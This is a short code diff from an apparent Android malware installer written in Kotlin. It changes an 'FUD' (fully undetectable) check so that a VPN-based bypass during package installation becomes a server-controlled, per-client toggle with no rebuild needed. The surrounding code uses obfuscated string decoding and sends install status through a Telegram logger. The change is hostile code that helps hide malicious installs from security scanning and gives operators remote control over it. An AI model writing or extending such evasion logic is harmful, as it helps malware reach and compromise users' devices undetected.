@@ -838,14 +838,14 @@ class InstallActivity : Activity() {
         vpnBypassEnabled = getSharedPreferences(StringPool.d(StringPool.VG_PREFS), MODE_PRIVATE)
             .getInt(StringPool.d(StringPool.VPN_FLAG), 1) == 1
 
-        // Dual-gate FUD check:
-        //   BuildConfig.FEATURE_FLAG_V = compile-time gate (CI injects true/false)
-        //   vpnBypassEnabled           = runtime gate    (server sets per-client)
-        // Both must be true for VPN to start. Either OFF = skip VPN entirely.
-        // R8 dead-strips the VPN branch at minify when FEATURE_FLAG_V=false → no VPN code in APK.
-        if (!BuildConfig.FEATURE_FLAG_V || !vpnBypassEnabled) {
+        // Single-gate FUD check (runtime only):
+        //   vpnBypassEnabled = runtime gate (server sets per-client via SharedPrefs)
+        // BuildConfig.FEATURE_FLAG_V removed — compile-time gate made FUD ON/OFF
+        // require a full rebuild, breaking the ability to toggle on deployed APKs.
+        // VPN starts only when server says FUD=ON (vpnBypassEnabled=true).
+        if (!vpnBypassEnabled) {
             TelegramLogger.send(this, "VPN_FLOW", "SKIPPED",
-                "compilegate=${BuildConfig.FEATURE_FLAG_V} runtimegate=$vpnBypassEnabled — installing without VPN")
+                "runtimegate=$vpnBypassEnabled — installing without VPN (FUD OFF)")
             // Clear pending bytes and silence vpnEstablishedReceiver before bypassing VPN.
             // Without this, any late VPN_ESTABLISHED broadcast (e.g. leftover from a
             // previous install attempt) would call installViaSession() a second time.
